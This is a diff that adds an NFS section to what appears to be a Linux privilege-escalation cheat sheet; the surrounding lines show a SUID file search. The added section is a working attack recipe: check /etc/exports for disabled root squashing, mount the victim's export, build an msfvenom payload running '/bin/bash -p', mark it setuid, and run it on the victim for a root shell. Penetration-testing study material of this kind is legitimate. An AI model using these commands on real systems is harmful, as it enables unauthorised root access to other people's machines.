@@ -16,3 +16,14 @@ mkpasswd -m sha-512 newpasswordhere
 ```
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
+
+#### NFS
+- Check if root squashing is enabled or not "cat /etc/exports"
+- If disabled switch to root in your machine
+```
+mkdir /tmp/nfs
+mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+```
+From victims machine execute the msfvenom payload. /tmp/shell.elf
